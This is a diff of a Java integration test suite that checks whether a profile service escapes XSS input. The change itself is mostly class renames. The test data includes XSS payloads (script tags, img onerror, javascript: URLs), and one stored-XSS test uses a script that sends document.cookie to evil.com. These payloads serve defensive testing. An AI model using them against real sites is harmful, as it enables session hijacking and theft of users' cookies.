@@ -1,8 +1,7 @@
 package com.adminplus.integration;
 
-import com.adminplus.pojo.dto.req.PasswordChangeReq;
-import com.adminplus.pojo.dto.req.ProfileUpdateReq;
-import com.adminplus.pojo.dto.resp.ProfileResp;
+import com.adminplus.pojo.dto.request.ProfileUpdateRequest;
+import com.adminplus.pojo.dto.response.ProfileResponse;
 import com.adminplus.pojo.entity.UserEntity;
 import com.adminplus.repository.ProfileRepository;
 import com.adminplus.service.ProfileService;
@@ -78,7 +77,7 @@ class ProfileServiceXssIntegrationTest {
         void shouldEscapeScriptTagInNickname() {
             // Given
             String xssNickname = "<script>alert('xss')</script>Hacked";
-            ProfileUpdateReq req = new ProfileUpdateReq(
+            ProfileUpdateRequest req = new ProfileUpdateRequest(
                     xssNickname,
                     null,
                     null,
@@ -86,7 +85,7 @@ class ProfileServiceXssIntegrationTest {
             );
 
             // When
-            ProfileResp result = profileService.updateCurrentProfile(req);
+            ProfileResponse result = profileService.updateCurrentProfile(req);
 
             // Then - 从数据库验证
             profileRepository.flush();
@@ -110,7 +109,7 @@ class ProfileServiceXssIntegrationTest {
         void shouldEscapeImgTagInEmail() {
             // Given
             String xssEmail = "<img src=x onerror=alert(1)>@test.com>";
-            ProfileUpdateReq req = new ProfileUpdateReq(
+            ProfileUpdateRequest req = new ProfileUpdateRequest(
                     null,
                     xssEmail,
                     null,
@@ -118,7 +117,7 @@ class ProfileServiceXssIntegrationTest {
             );
 
             // When
-            ProfileResp result = profileService.updateCurrentProfile(req);
+            ProfileResponse result = profileService.updateCurrentProfile(req);
 
             // Then
             UserEntity updatedUser = profileRepository.findById(testUser.getId())
@@ -134,7 +133,7 @@ class ProfileServiceXssIntegrationTest {
         void shouldEscapeHtmlInPhone() {
             // Given
             String xssPhone = "<>&\"'13800138000";
-            ProfileUpdateReq req = new ProfileUpdateReq(
+            ProfileUpdateRequest req = new ProfileUpdateRequest(
                     null,
                     null,
                     xssPhone,
@@ -159,7 +158,7 @@ class ProfileServiceXssIntegrationTest {
         void shouldEscapeXssInAvatar() {
             // Given
             String xssAvatar = "javascript:alert(1)";
-            ProfileUpdateReq req = new ProfileUpdateReq(
+            ProfileUpdateRequest req = new ProfileUpdateRequest(
                     null,
                     null,
                     null,
@@ -167,7 +166,7 @@ class ProfileServiceXssIntegrationTest {
             );
 
             // When
-            ProfileResp result = profileService.updateCurrentProfile(req);
+            ProfileResponse result = profileService.updateCurrentProfile(req);
 
             // Then
             UserEntity updatedUser = profileRepository.findById(testUser.getId())
@@ -182,7 +181,7 @@ class ProfileServiceXssIntegrationTest {
         @DisplayName("多个字段同时包含 XSS 应全部被转义")
         void shouldEscapeXssInAllFields() {
             // Given
-            ProfileUpdateReq req = new ProfileUpdateReq(
+            ProfileUpdateRequest req = new ProfileUpdateRequest(
                     "<script>alert(1)</script>",
                     "<img src=x onerror=alert(1)>@test.com",
                     "<>\"'13800138000",
@@ -190,7 +189,7 @@ class ProfileServiceXssIntegrationTest {
             );
 
             // When
-            ProfileResp result = profileService.updateCurrentProfile(req);
+            ProfileResponse result = profileService.updateCurrentProfile(req);
 
             // Then
             UserEntity updatedUser = profileRepository.findById(testUser.getId())
@@ -211,7 +210,7 @@ class ProfileServiceXssIntegrationTest {
         void shouldKeepOriginalValueForNull() {
             // Given
             String originalNickname = testUser.getNickname();
-            ProfileUpdateReq req = new ProfileUpdateReq(
+            ProfileUpdateRequest req = new ProfileUpdateRequest(
                     null,  // 不更新
                     null,
                     null,
@@ -219,7 +218,7 @@ class ProfileServiceXssIntegrationTest {
             );
 
             // When
-            ProfileResp result = profileService.updateCurrentProfile(req);
+            ProfileResponse result = profileService.updateCurrentProfile(req);
 
             // Then
             assertThat(result.nickname()).isEqualTo(originalNickname);
@@ -231,7 +230,7 @@ class ProfileServiceXssIntegrationTest {
         @DisplayName("空字符串应正常保存")
         void shouldHandleEmptyString() {
             // Given
-            ProfileUpdateReq req = new ProfileUpdateReq(
+            ProfileUpdateRequest req = new ProfileUpdateRequest(
                     "",
                     "",
                     "",
@@ -239,7 +238,7 @@ class ProfileServiceXssIntegrationTest {
             );
 
             // When
-            ProfileResp result = profileService.updateCurrentProfile(req);
+            ProfileResponse result = profileService.updateCurrentProfile(req);
 
             // Then
             assertThat(result.nickname()).isEqualTo("");
@@ -252,7 +251,7 @@ class ProfileServiceXssIntegrationTest {
         void shouldEscapeOnlyXssString() {
             // Given
             String onlyXss = "<script><img src=x onerror=alert(1)></script>";
-            ProfileUpdateReq req = new ProfileUpdateReq(
+            ProfileUpdateRequest req = new ProfileUpdateRequest(
                     onlyXss,
                     null,
                     null,
@@ -260,7 +259,7 @@ class ProfileServiceXssIntegrationTest {
             );
 
             // When
-            ProfileResp result = profileService.updateCurrentProfile(req);
+            ProfileResponse result = profileService.updateCurrentProfile(req);
 
             // Then
             UserEntity user = profileRepository.findById(testUser.getId()).orElseThrow();
@@ -279,7 +278,7 @@ class ProfileServiceXssIntegrationTest {
         void shouldVerifyEscapedDataPersisted() {
             // Given
             String xssValue = "<div onclick=\"alert('xss')\">Click</div>";
-            ProfileUpdateReq req = new ProfileUpdateReq(
+            ProfileUpdateRequest req = new ProfileUpdateRequest(
                     xssValue,
                     null,
                     null,
@@ -300,7 +299,7 @@ class ProfileServiceXssIntegrationTest {
                     .doesNotContain("onclick=");
 
             // 验证 getCurrentUserProfile 也返回转义后的值
-            ProfileResp fromService = profileService.getCurrentUserProfile();
+            ProfileResponse fromService = profileService.getCurrentUserProfile();
             assertThat(fromService.nickname())
                     .isEqualTo(persisted.getNickname());
         }
@@ -309,12 +308,12 @@ class ProfileServiceXssIntegrationTest {
         @DisplayName("验证多次更新每次都转义")
         void shouldEscapeOnMultipleUpdates() {
             // 第一次更新
-            profileService.updateCurrentProfile(new ProfileUpdateReq(
+            profileService.updateCurrentProfile(new ProfileUpdateRequest(
                     "<script>first</script>", null, null, null
             ));
 
             // 第二次更新
-            profileService.updateCurrentProfile(new ProfileUpdateReq(
+            profileService.updateCurrentProfile(new ProfileUpdateRequest(
                     "<img src=x onerror=alert(1)>", null, null, null
             ));
 
@@ -335,7 +334,7 @@ class ProfileServiceXssIntegrationTest {
         void shouldSimulateStoredXssInProfile() {
             // Given - 用户在个人中心昵称中注入恶意脚本
             String maliciousNickname = "<script>fetch('https://evil.com?c='+document.cookie)</script>";
-            ProfileUpdateReq req = new ProfileUpdateReq(
+            ProfileUpdateRequest req = new ProfileUpdateRequest(
                     maliciousNickname,
                     null,
                     null,
@@ -343,7 +342,7 @@ class ProfileServiceXssIntegrationTest {
             );
 
             // When
-            ProfileResp result = profileService.updateCurrentProfile(req);
+            ProfileResponse result = profileService.updateCurrentProfile(req);
 
             // Then - 验证攻击被防御
             UserEntity user = profileRepository.findById(testUser.getId()).orElseThrow();
@@ -365,7 +364,7 @@ class ProfileServiceXssIntegrationTest {
         void shouldSimulateXssInEmailField() {
             // Given
             String xssEmail = "<body onload=alert('XSS')>@test.com>";
-            ProfileUpdateReq req = new ProfileUpdateReq(
+            ProfileUpdateRequest req = new ProfileUpdateRequest(
                     null,
                     xssEmail,
                     null,
@@ -373,7 +372,7 @@ class ProfileServiceXssIntegrationTest {
             );
 
             // When
-            ProfileResp result = profileService.updateCurrentProfile(req);
+            ProfileResponse result = profileService.updateCurrentProfile(req);
 
             // Then
             assertThat(result.email())
